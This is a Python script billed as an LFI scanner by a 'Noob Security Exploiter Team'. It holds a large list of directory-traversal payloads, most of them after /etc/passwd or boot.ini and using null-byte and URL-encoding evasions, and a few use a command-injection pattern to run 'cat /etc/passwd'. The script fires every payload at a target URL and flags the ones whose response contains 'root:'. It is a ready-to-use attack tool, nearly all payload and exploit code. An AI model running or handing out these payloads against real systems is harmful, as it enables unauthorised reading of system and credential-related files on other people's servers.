# import modul
import requests
import sys
import argparse
import colorama
import os

from requests import get
from sys import argv
from argparse import ArgumentParser
from colorama import Fore
from os import system

def banner():
	print(Fore.LIGHTBLUE_EX+"""
 _     _____ ___   ____   ____    _    _   _ _   _ _____ ____
| |   |  ___|_ _| / ___| / ___|  / \  | \ | | \ | | ____|  _ \
| |   | |_   | |  \___ \| |     / _ \ |  \| |  \| |  _| | |_) |
| |___|  _|  | |   ___) | |___ / ___ \| |\  | |\  | |___|  _ <
|_____|_|   |___| |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\
[+] Noob Security Exploiter Team LFI Scanner[+]\n"""+Fore.RESET)

# list payload
payloads = [
"/etc/passwd%2500",
"/etc/passwd%00	",
"/etc/passwd",
"///etc///passwd%2500",
"///etc///passwd%00",
"///etc///passwd",
"../etc/passwd%2500",
"../etc/passwd%00",
"../etc/passwd",
"..///etc///passwd%2500",
"..///etc///passwd%00",
"..///etc///passwd",
"..///..///etc///passwd%2500",
"..///..///etc///passwd%00",
"..///..///etc///passwd",
"..///..///..///etc///passwd%2500",
"..///..///..///etc///passwd%00",
"..///..///..///etc///passwd",
"..///..///..///..///etc///passwd%2500",
"..///..///..///..///etc///passwd%00",
"..///..///..///..///etc///passwd",
"..///..///..///..///..///etc///passwd%2500",
"..///..///..///..///..///etc///passwd%00",
"..///..///..///..///..///etc///passwd",
"..///..///..///..///..///..///etc///passwd%2500",
"..///..///..///..///..///..///etc///passwd%00",
"..///..///..///..///..///..///etc///passwd",
"..///..///..///..///..///..///..///etc///passwd%2500",
"..///..///..///..///..///..///..///etc///passwd%00",
"..///..///..///..///..///..///..///etc///passwd",
"..///..///..///..///..///..///..///..///etc///passwd%2500",
"..///..///..///..///..///..///..///..///etc///passwd%00",
"..///..///..///..///..///..///..///..///etc///passwd",
"../../etc/passwd%2500",
"../../etc/passwd%00",
"../../etc/passwd",
"../../../etc/passwd%2500",
"../../../etc/passwd%00",
"../../../etc/passwd",
"../../../../etc/passwd%2500",
"../../../../etc/passwd%00",
"../../../../etc/passwd%00",
"../../../../etc/passwd",
"../../../../../etc/passwd%00",
"../../../../../etc/passwd",
"../../../../../../etc/passwd%2500",
"../../../../../../etc/passwd%00",
"../../../../../../etc/passwd",
"../../../../../../../etc/passwd%2500",
"../../../../../../../etc/passwd%00",
"../../../../../../../etc/passwd",
"../../../../../../../../etc/passwd%2500",
"../../../../../../../../etc/passwd%00",
"../../../../../../../../etc/passwd",
"\etc\passwd%2500",
"\etc\passwd%00",
"\etc\passwd",
"..\etc\passwd%2500",
"..\etc\passwd%00",
"..\etc\passwd",
"..\..\etc\passwd%2500",
"..\..\etc\passwd%00",
"..\..\etc\passwd",
"..\..\..\etc\passwd%2500",
"..\..\..\etc\passwd%00",
"..\..\..\etc\passwd",
"..\..\..\..\etc\passwd%2500",
"..\..\..\..\etc\passwd%00",
"..\..\..\..\etc\passwd",
"..\..\..\..\..\etc\passwd%2500",
"..\..\..\..\..\etc\passwd%00",
"..\..\..\..\..\etc\passwd",
"..\..\..\..\..\..\etc\passwd%2500",
"..\..\..\..\..\..\etc\passwd%00",
"..\..\..\..\..\..\etc\passwd",
"..\..\..\..\..\..\..\etc\passwd%2500",
"..\..\..\..\..\..\..\etc\passwd%00",
"..\..\..\..\..\..\..\etc\passwd",
"..\..\..\..\..\..\..\..\etc\passwd%2500",
"..\..\..\..\..\..\..\..\etc\passwd%00",
"..\..\..\..\..\..\..\..\etc\passwd",
"%00../../../../../../etc/passwd",
"%00/etc/passwd%00",
"%0a/bin/cat%20/etc/passwd",
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
"/etc/default/passwd",
"/etc/master.passwd",
"././././././././././././etc/passwd",
".//.//.//.//.//.//.//.//.//.//.//.//etc//passwd",
"/./././././././././././etc/passwd",
"/../../../../../../../../../../etc/passwd",
"/../../../../../../../../../../etc/passwd^^",
"/..\../..\../..\../..\../..\../..\../etc/passwd",
"/etc/passwd",
"../../../../../../../../../../../../etc/passwd",
"../../../../../../../../../../../etc/passwd",
"../../../../../../../../../../etc/passwd",
"../../../../../../../../../etc/passwd",
"../../../../../../../../etc/passwd",
"../../../../../../../etc/passwd",
"../../../../../../etc/passwd",
"../../../../../etc/passwd",
"../../../../etc/passwd",
"../../../etc/passwd",
"../../etc/passwd",
"../etc/passwd",
"..\..\..\..\..\..\..\..\..\..\etc\passwd",
"\..\..\..\..\..\..\..\..\..\..\etc\passwd",
"etc/passwd",
"/etc/passwd%00",
"../../../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../etc/passwd%00",
"../../../../../../../../etc/passwd%00",
"../../../../../../../etc/passwd%00",
"../../../../../../etc/passwd%00",
"../../../../../etc/passwd%00",
"../../../../etc/passwd%00",
"../../../etc/passwd%00",
"../../etc/passwd%00",
"../etc/passwd%00",
"..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
"\..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
"/../../../../../../../../../../../etc/passwd%00.html",
"/../../../../../../../../../../../etc/passwd%00.jpg",
"../../../../../../etc/passwd&=%3C%3C%3C%3C",
"..2fetc2fpasswd",
"..2fetc2fpasswd%00",
"..2f..2fetc2fpasswd",
"..2f..2fetc2fpasswd%00",
"..2f..2f..2fetc2fpasswd",
"..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini",
"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
"..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini",
"..\../..\../..\../..\../..\../..\../boot.ini",
"..//..//..//..//..//boot.ini",
"../../../../../../../../../../../../boot.ini",
"../../boot.ini",
"..\../..\../..\../..\../boot.ini",
"../../../../../../../../../../../../boot.ini%00",
"/../../../../../../../../../../../boot.ini%00.html",
"..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini",
"C:/boot.ini",
"../../../../../../../../../../../../boot.ini#",
"../../../../../../../../../../../boot.ini#.html",
]

# display arguments
arg = ArgumentParser(description=" LFI (Local File Inclusion) Noob Security Exploiter Team scanner")
arg.add_argument("-u","--url",help="target url",required=True)

if len(argv) == 1:
	arg.print_help()
	arg.exit()

# tell the user to enter the target url
if len(argv) >= 1:
	system("clear")
	banner() # print banner

	for payload in payloads:
		url = argv[2]
		gabung = url+payload
		ex = get(gabung)

		# check if there is a root text in the text
		if "root:" in ex.text:
			print(Fore.LIGHTGREEN_EX+"found"+Fore.RESET,url+payload)

		# if not there
		else:
			print(Fore.LIGHTRED_EX+"not found"+Fore.RESET,url+payload)